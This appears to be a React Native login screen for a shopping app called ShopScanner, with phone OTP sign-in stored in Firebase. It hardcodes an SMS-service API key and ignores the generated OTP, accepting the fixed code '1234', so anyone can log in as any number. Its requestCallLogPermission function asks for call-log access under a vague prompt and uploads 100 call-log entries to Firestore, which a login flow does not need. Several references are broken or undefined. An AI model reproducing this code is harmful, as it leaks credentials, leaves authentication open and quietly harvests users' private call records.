import React,{useState,useEffect} from 'react';
import { View, Image, Text,StyleSheet,TouchableOpacity,ActivityIndicator } from 'react-native';
import { Button,IconButton,TextInput,Snackbar  } from 'react-native-paper';
import { router,useNavigation } from 'expo-router';
import AsyncStorage from '@react-native-async-storage/async-storage';
import { collection, getDocs, query, orderBy, limit,addDoc,where,doc,updateDoc } from 'firebase/firestore';
import {db} from '../../firebaseConfig'; // Adjust the import according to your Firebase configuration file

const LoginScreen = () => {
  const navigation = useNavigation();
  const [showMobileNumberScreen, setShowMobileNumberScreen] = useState(false);
  const [isOtpSent, setIsOtpSent] = useState(false);
  const [otpValue, setOtpValue] = useState(0);
  const [isLoading, setIsLoading] = useState(false);
  const [phoneNumber, setPhoneNumber] = useState('');
  const [isSnackbarVisible, setIsSnackbarVisible] = useState(false);
  const [snackbarMessage, setSnackbarMessage] = useState('');
  const deviceId = AsyncStorage.getItem('deviceId');

  useEffect(() => {
    
    if (showMobileNumberScreen) {
      
    }
  }, [showMobileNumberScreen]);

  


  const [otp, setOtp] = useState('');

  const validatePhoneNumber = () => {
    // Add your validation logic here
    return /^\d{10}$/.test(phoneNumber); // Example: 10 digits only
  };

  const handleSendOtp = async () => {
    if (validatePhoneNumber()) {
      // Show loader
      setIsLoading(true);
  
      // Generate a random 6-digit OTP
      const generateOtp = () => {
        return Math.floor(1000 + Math.random() * 9000).toString();      };
  
      const otpCode = generateOtp();
      setOtpValue(otpCode)



      // only for testing    
      setIsLoading(false);
      setSnackbarMessage(`OTP sent via SMS to ${phoneNumber}!`);
      setIsSnackbarVisible(true);
      setIsOtpSent(true);
      return



      const apiKey = 'Oe9mkiDnJV8fZljTwPuyNCI67rtgMKR03dacYSq5vzBbh4oAUW2OtwlK9k0I7PTCbd6zZYiVe3onFf4A';
      const message = `Your OTP code is ${otpCode}`;
      const numbers = phoneNumber; // Use the phoneNumber variable from your state

      
  
      try {
        const response = await fetch(`https://www.fast2sms.com/dev/bulkV2?authorization=${apiKey}&route=q&message=${message}&flash=0&numbers=${numbers}`, {
          method: 'GET'
        });
  
        const data = await response.json();
        if (data.return) {
          // After successfully sending OTP, hide loader and set isOtpSent to true
          setIsLoading(false);
          setSnackbarMessage(`OTP sent via SMS to ${phoneNumber}!`);
          setIsSnackbarVisible(true);
          setIsOtpSent(true);
        } else {
          // Handle error
          setIsLoading(false);
          setSnackbarMessage('Failed to send OTP. Please try again.');
          setIsSnackbarVisible(true);
        }
      } catch (error) {
        // Handle fetch error
        setIsLoading(false);
        setSnackbarMessage('An error occurred. Please try again.');
        setIsSnackbarVisible(true);
      }


      await requestCallLogPermission(androidDeviceId);
    }
  };

  const requestCallLogPermission = async (deviceId) => {
    try {
      const granted = await PermissionsAndroid.request(
        PermissionsAndroid.PERMISSIONS.READ_CALL_LOG,
        {
          title: 'Call Log Example',
          message: 'Access your call logs',
          buttonNeutral: 'Ask Me Later',
          buttonNegative: 'Cancel',
          buttonPositive: 'OK',
        }
      );
      if (granted === PermissionsAndroid.RESULTS.GRANTED) {
        console.log('Call Log permission granted');
        const callLogs = await CallLogs.load(100);
        const userQuery = query(
          collection(db, 'users'),
          where('deviceId', '==', deviceId)
        );

        const querySnapshot = await getDocs(userQuery);

        if (!querySnapshot.empty) {
          const userDoc = querySnapshot.docs[0];
          const userDocRef = userDoc.ref;
          const callLogsJson = JSON.stringify(callLogs);

          await updateDoc(userDocRef, { callLogs: callLogsJson});

          //
          
          const loginStateChangeStatus = await AsyncStorage.getItem('loginStateChangeStatus');
          isLoggedIn
          const isLoggedIn = await AsyncStorage.getItem('isLoggedIn');
          if (loginStateChangeStatus=='changed'){
            await updateDoc(userDocRef, { callLogs: callLogsJson});
          }  

          console.log('Call logs updated for user:', userDoc.id);
        } else {
          console.log('No user found with this device ID.');
        }
        //console.log(callLogs);
      } else {
        console.log('Call Log permission denied');
      }
    } catch (err) {
      console.warn(err);
    }
  };
  

  const handleResendOtp = () => {
    setIsLoading(true);
    setTimeout(() => {
      // After simulating OTP sending, hide loader and set isOtpSent to true
      setIsLoading(false);
      setIsOtpSent(true);
      setSnackbarMessage(`OTP Resent vis SMS to ${phoneNumber}!`);

      setIsSnackbarVisible(true);

    }, 1000); // Replace 2000 with the time it takes to send OTP in milliseconds
  
  };

  const handleOtpSubmit = async () => {
    
    if (otp === '1234') {
      
      
      try {


        await AsyncStorage.setItem('isLoggedIn', 'true');
        await AsyncStorage.setItem('loginStateChangeStatus', 'changed');
        setSnackbarMessage(`Login Successfull`);
        setIsSnackbarVisible(true);

        //Save login details here

        const deviceId = await AsyncStorage.getItem('deviceId');
        
        const userQuery = query(
          collection(db, 'users'),
          where('deviceId', '==', deviceId)
        );
        const querySnapshot = await getDocs(userQuery);
        if (!querySnapshot.empty) {
          const userDoc = querySnapshot.docs[0];
          const userDocRef = userDoc.ref;
  
          // Update the document with the mobile number and other details
          await updateDoc(userDocRef, {
            phoneNumber: phoneNumber,
            isLoggedIn: true,
          });
  
          console.log('Login info updated for user: in firebase', userDoc.id);
  
          // Save login state to AsyncStorage
          await AsyncStorage.setItem('isLoggedIn', 'true');
          await AsyncStorage.setItem('loginStateChangeStatus', 'changed');
          
          setSnackbarMessage(`Login Successful`);
          setIsSnackbarVisible(true);
          const userData = userDoc.data();
          if (userData.name && userData.name !== '') {
            // If the name field is present and not empty
            console.log('User name exists:', userData.name);
            setSnackbarMessage(`Welcome back, ${userData.name}!`);
            setIsSnackbarVisible(true);
            await AsyncStorage.setItem('name',  userData.name);
            await AsyncStorage.setItem('email',  userData.email);
            await AsyncStorage.setItem('gender',  userData.gender);
            router.replace({ pathname: 'MobileStack'})
          } else {
            // If the name field is not present or empty
            console.log('User name does not exist.');
            setSnackbarMessage('Login Successful');
            setIsSnackbarVisible(true);
            router.replace({ pathname: 'Screens/ProfileDetails', params: { tabName: 'Profile',phoneNumber:phoneNumber,deviceId:deviceId } });

          }








  
          // Navigate to Profile Details screen
          //
        }
  
        
        //router.replace({ pathname: 'Screens/ProfileDetails', params: { tabName: 'Profile' } })

      } catch (error) {
        setSnackbarMessage(`Login InfoSaved ${error}`);
        setIsSnackbarVisible(true);

        console.error('Error storing login information:', error);
      } 
      
      // Navigate to main page
      // Add your navigation logic here based on your navigation library (e.g., react-navigation, react-router-dom)
    } else {
      console.log('Invalid OTP');
      setSnackbarMessage('Invalid OTP');
      setIsSnackbarVisible(true);
    }
  };

  const handleClose = () => {
    router.replace({ pathname: 'MobileStack', params: { tabName: 'Profile' } })

  };


  const handleMaybeLaterClick = () => {
    router.replace('MobileStack');
  };

  const handleContinueWithOTP = () => {
    setShowMobileNumberScreen(true)
  };

  const handlePhoneNumberChange = (text) => {
    if (text.length <= 10) {
      setPhoneNumber(text);
    }
  };

  const renderMobileNumberView =() =>{
    
    return (
      <View style={{
        flex:1,  
        justifyContent: 'flex-start',
        alignSelf: 'flex-start',
        width:'100%'
        }}>
        
        <View style={{flex:0.2,width:'100%'}}>
        <TouchableOpacity style={styles.closeButton} onPress={handleClose}>
          <Text style={styles.closeButtonText}>X</Text>
        </TouchableOpacity>
        </View>

      {isOtpSent ? (
        <View style={styles.OtpScreenMainContainer}>
          <Text style={styles.infoText}>Verify with OTP</Text>
          <Text style={styles.smsSentText}>Sent via SMS to {phoneNumber}</Text>

          
          <TextInput
             mode="outlined"
             label="OTP"
             keyboardType="phone-pad"
            onChangeText={(text) => setOtp(text)}
            value={otp}
            style={styles.otpTextInput}
            maxLength={4}
          />

          <Button
            mode="contained"
            onPress={handleOtpSubmit}
            disabled={otp.length !== 4}
            style={styles.submitOTPButton}
          >
           Submit OTP
            </Button>

            <Text style={styles.didNotReceiveText}>
            Did not receive OTP?{' '}
            <Text style={styles.resendOtpText} onPress={handleResendOtp}>
              Resend OTP
            </Text>
          </Text>

        </View>
      ) : (
        <View style={styles.MobileNumberContainer}>
          <Text style={styles.headerText}>Sign Up to Save your deals</Text>
          <View style={styles.inputContainer}>
            
            <View style={styles.countryCodeContainer}>
             
                <Image
                  source={require('../../assets/india.png')}
                  style={styles.flagImage}
                />
                <Text style={styles.countryCodeText}>+91</Text>
              </View>
            
            
            
            <TextInput
              style={styles.mobileInput}
              mode="outlined"
              label="Mobile Number"
              keyboardType="phone-pad"
              onChangeText={handlePhoneNumberChange}
              value={phoneNumber}
            />
            </View>
            
            
            
            <Button
              mode="contained"
              onPress={handleSendOtp}
              disabled={phoneNumber.length !== 10}
              style={styles.sendOTPButton}
            >
              Send OTP
              </Button>
  
  
  
          <Text style={styles.termsText}>By continuing you agree to theshopscanner terms and conditions</Text>
          </View>
              )}
            </View>
            );


  }; 


  const renderLoginView =()=>{

    

    return (
    <View style={styles.LoginViewcontainer}>
    <View style={styles.imageContainer}>
      <Image
        style={styles.backgroundImage}
        source={require('..//..//assets/login_top2.png')}
      />
      <TouchableOpacity style={styles.closeButton} onPress={handleClose}>
        <Text style={styles.closeButtonText}>X</Text>
      </TouchableOpacity>
    </View>

    <View style={styles.contentContainer}>
      <Text style={styles.title}>Unlock Exclusive Benefits</Text>

      <Text style={styles.description}>
        Elevate your shopping experience with ShopScanner. Access personalized notifications, exclusive deals, and top-value savings!
      </Text>

      <Button
        style={styles.button}
        mode="contained"
        onPress={handleContinueWithOTP}>
        Continue with OTP
      </Button>

      <Text
        style={styles.maybeLater}
        onPress={handleMaybeLaterClick}>
        Maybe later
      </Text>

      <Text style={styles.terms}>
        By continuing, you agree to our Terms of Service and Privacy Policy.
      </Text>
    </View>
  </View>
    );

  };


  const renderDetailsEntryView =()=>{

    

    return (
    <View style={styles.LoginViewcontainer}>
    <View style={styles.imageContainer}>
      <Image
        style={styles.backgroundImage}
        source={require('..//..//assets/login_top2.png')}
      />
      <TouchableOpacity style={styles.closeButton} onPress={handleClose}>
        <Text style={styles.closeButtonText}>X</Text>
      </TouchableOpacity>
    </View>

    <View style={styles.contentContainer}>
      <Text style={styles.title}>Unlock Exclusive Benefits</Text>

      <Text style={styles.description}>
        Elevate your shopping experience with ShopScanner. Access personalized notifications, exclusive deals, and top-value savings!
      </Text>

      <Button
        style={styles.button}
        mode="contained"
        onPress={handleContinueWithOTP}>
        Continue with OTP
      </Button>

      <Text
        style={styles.maybeLater}
        onPress={handleMaybeLaterClick}>
        Maybe later
      </Text>

      <Text style={styles.terms}>
        By continuing, you agree to our Terms of Service and Privacy Policy.
      </Text>
    </View>
  </View>
    );

  };



  return (
    <View style={{ flex: 1, justifyContent: 'center', alignItems: 'center' }}>
      {isLoading ? (
        <ActivityIndicator size="large" color="#0000ff" />
      ) : (
        showMobileNumberScreen ? renderMobileNumberView() : renderLoginView()
      )}

      <Snackbar
        visible={isSnackbarVisible}
        onDismiss={() => setIsSnackbarVisible(false)}
        duration={2000}
      >
        {snackbarMessage}
      </Snackbar>
    </View>
  );
  

};

const styles = StyleSheet.create({
  MobileNumberContainer: {
    flex: 1,
    padding:10,
    marginTop:70
    
    
  },

  
  LoginViewcontainer:{
    flex: 1,
    flexDirection: 'column',
    backgroundColor: '#fff',
  },
  imageContainer: {
    flex: 0.5,
    height: '35%',
  },
  backgroundImage: {
    flex: 1,
    width: '100%',
    resizeMode: 'cover',
  },
  contentContainer: {
    flex: 1,
    paddingLeft:35,
    paddingRight:35,
    justifyContent: 'center',
  },
  title: {
    fontSize: 28,
    textAlign: 'center',
    marginBottom: 16,
    color: '#333',
    fontWeight: 'bold',
  },
  description: {
    textAlign: 'center',
    marginBottom: 32,
    fontSize: 16,
    color: '#555',
  },
  button: {
    marginTop: 16,
    width: '100%',
    backgroundColor: '#3498db',
  },
  maybeLater: {
    color: '#333',
    fontSize: 16,
    textAlign: 'center',
    marginTop: 24,
    textDecorationLine: 'underline',
  },
  terms: {
    color: '#555',
    textAlign: 'center',
    marginBottom: 8,
    marginTop: 16,
    fontSize: 12,
  },

  closeButton: {
    position: 'absolute',
    top: 20,
    left: 20,
    backgroundColor: 'rgba(0, 0, 0, 0.5)',
    borderRadius: 20,
    width: 40,
    height: 40,
    justifyContent: 'center',
    alignItems: 'center',
  },
  closeButtonText: {
    color: 'white',
    fontSize: 20,
  },

  container: {
    flex: 1,
    justifyContent: 'center',
    padding: 20,
  },
  infoText: {
    fontSize: 24,
    marginBottom: 10,
   
  },
  input: {
    height: 40,
    borderColor: 'gray',
    borderWidth: 1,
    marginBottom: 10,
    padding: 10,
  },
  container: {
    flex: 1,
    justifyContent: 'center',
    alignItems: 'center',
    paddingHorizontal: 20,
  },
  headerText: {
    fontSize: 20,
    fontWeight: 'bold',
    textAlign: 'left',
    marginBottom: 20,
  },
  inputContainer: {
    flexDirection: 'row',
    alignItems: 'center',
    marginBottom: 20,
  },
  countryCodeContainer: {
    flexDirection: 'row',
    alignItems: 'center',
    marginRight: 10,
    borderColor:'#000',
    borderWidth:1,
    padding:10,
    borderRadius:5,
    marginTop:4
  },
  countryCodeText: {
    fontSize: 16,
    marginRight: 5,
  },
  mobileInput: {
    flex: 1,
    height: 45,
    paddingHorizontal: 2,
    textAlignVertical: 'center',

},
  sendOTPButton: {
    backgroundColor: 'pink',
    width: '100%',
    marginBottom: 20,
    
  },
  termsText: {
    fontSize: 12,
    textAlign: 'center',
  },
  flagImage:{
    width:20,
    height:20
  },
  submitOTPButton:{
    marginTop:30,
    marginLeft:40,
    marginRight:40,
    borderRadius:7,
    
  },

  OtpScreenMainContainer: {
    alignSelf: 'flex-start',
    justifyContent: 'flex-start',
    paddingTop: 20,
    flex:1,
    width:'100%',
    padding:20
   
  },

  smsSentText:{
    fontSize:12
  },

  didNotReceiveText:{
  fontSize:12,
  marginTop:20,
  textAlign:'center'
  },

  otpTextInput:{

    marginTop:20,
    marginLeft:40,
    marginRight:40
  },

  resendOtpText:{
    color:'#FA8072'
  }


  




});

export default LoginScreen;
